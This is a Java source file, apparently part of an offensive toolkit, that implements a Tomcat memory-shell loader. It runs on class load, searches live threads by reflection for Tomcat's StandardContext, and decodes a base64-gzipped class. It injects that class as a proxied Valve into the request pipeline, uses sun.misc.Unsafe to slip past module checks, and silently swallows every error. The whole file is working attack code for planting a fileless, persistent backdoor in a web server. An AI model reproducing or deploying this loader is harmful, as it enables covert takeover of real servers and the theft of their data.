package com.ppp.middleware.loader;


import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;
import sun.misc.Unsafe;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.*;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 */
@Middleware(Middleware.Tomcat)
@MemShell(MemShell.Valve)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
public class TomcatAutoFindValveThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME;
    static {
        new TomcatAutoFindValveThreadLoader();
    }
    public TomcatAutoFindValveThreadLoader() {
        try {
            // 获取 standardContext
            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
            inject(standardContext);
        } catch (Throwable e) {

        }
    }

    public TomcatAutoFindValveThreadLoader(Object o) {

    }

    public static void inject(Object standardContext) {
        try {
            addModule();
            Object pipeline = getFieldValue(standardContext, "pipeline");
            Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", new Class[]{}, new Object[]{});
            for (Object valve : valves) {
                if (valve.getClass().getName().equalsIgnoreCase(CLASSNAME)) {
                    return;
                }
            }

            byte[] bytes = decompress(gzipObject);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            Class clazz;
            try {
                clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
            } catch (Exception e) {
                clazz = classLoader.loadClass(CLASSNAME);
            }

//            invokeMethod(pipeline, "addValve", new Class[]{Class.forName("org.apache.catalina.Valve")}, new Object[]{clazz.newInstance()});

            Constructor constructor = clazz.getDeclaredConstructor(Object.class);
            constructor.setAccessible(true);
            Object javaObject = constructor.newInstance(pipeline);

            Class valveClass = Class.forName("org.apache.catalina.Valve");
            Object object = Proxy.newProxyInstance(valveClass.getClassLoader(), new Class[]{valveClass}, (InvocationHandler) javaObject);
            invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{object});
        } catch (Exception e) {

        }
    }

    public static byte[] decompress(String gzipObject) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(base64(gzipObject));
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static byte[] base64(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new TomcatAutoFindValveThreadLoader(null).getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(int.class.getName());
        breakObject.add(short.class.getName());
        breakObject.add(long.class.getName());
        breakObject.add(double.class.getName());
        breakObject.add(byte.class.getName());
        breakObject.add(float.class.getName());
        breakObject.add(char.class.getName());
        breakObject.add(boolean.class.getName());
        breakObject.add(Integer.class.getName());
        breakObject.add(Short.class.getName());
        breakObject.add(Long.class.getName());
        breakObject.add(Double.class.getName());
        breakObject.add(Byte.class.getName());
        breakObject.add(Float.class.getName());
        breakObject.add(Character.class.getName());
        breakObject.add(Boolean.class.getName());
        breakObject.add(String.class.getName());
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }
    public static void addModule() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            Method method = Class.class.getDeclaredMethod("getModule");
            method.setAccessible(true);
            Object module = method.invoke(Object.class);
            Class cls = TomcatAutoFindValveThreadLoader.class;
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.setAccessible(true);
            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
        } catch (Exception e) {

        }
    }

}
